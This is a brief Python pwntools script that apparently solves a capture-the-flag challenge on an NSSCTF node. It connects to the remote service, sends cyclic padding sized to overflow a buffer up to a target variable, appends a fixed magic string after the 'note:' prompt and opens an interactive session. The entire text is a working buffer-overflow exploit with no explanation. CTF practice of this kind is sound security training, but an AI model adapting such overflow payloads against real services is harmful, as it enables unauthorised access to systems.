from pwn import *

io = remote("node5.anna.nssctf.cn", 29345)

payload = cyclic(0xa0-0x5a) + b"Limiter and Wings are beautiful girls!"
io.recvuntil(b"note:")
io.send(payload)
io.interactive()
